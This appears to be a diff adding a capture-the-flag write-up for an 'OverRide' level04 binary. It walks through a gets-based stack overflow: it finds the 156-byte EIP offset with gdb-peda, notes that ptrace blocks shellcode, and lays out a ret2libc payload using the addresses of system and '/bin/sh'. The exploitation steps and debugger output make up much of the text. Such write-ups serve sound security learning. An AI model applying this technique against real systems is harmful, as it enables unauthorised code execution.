@@ -1,0 +1,33 @@
+In the forked child, we can see an unprotected call to <gets>.
+Using gdb, we can make the program segfault with an input of 156 bytes.
+
+$ gdb-peda$ pattern create 300
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+
+Stopped reason: SIGSEGV
+0x71414154 in ?? ()
+
+$ gdb-peda$ pattern search
+Registers contain pattern buffer:
+EIP+0 found at offset: 156
+
+We tried to load a shellcode in the environment but <ptrace> blocks us..
+
+level04@OverRide:~$ cat <(python /tmp/exp.py) - | ./level04
+Give me some shellcode, k
+no exec() for you
+
+Let's try a ret2libc then !
+For this we need the address of <system> and "/bin/sh"
+
+$ gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f897ec ("/bin/sh")
+
+$ gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+Now that we have our addresses, the exploit will look something like this
+
+<156 bytes of trash> + <system address> + <4 bytes of trash> + </bin/sh address>
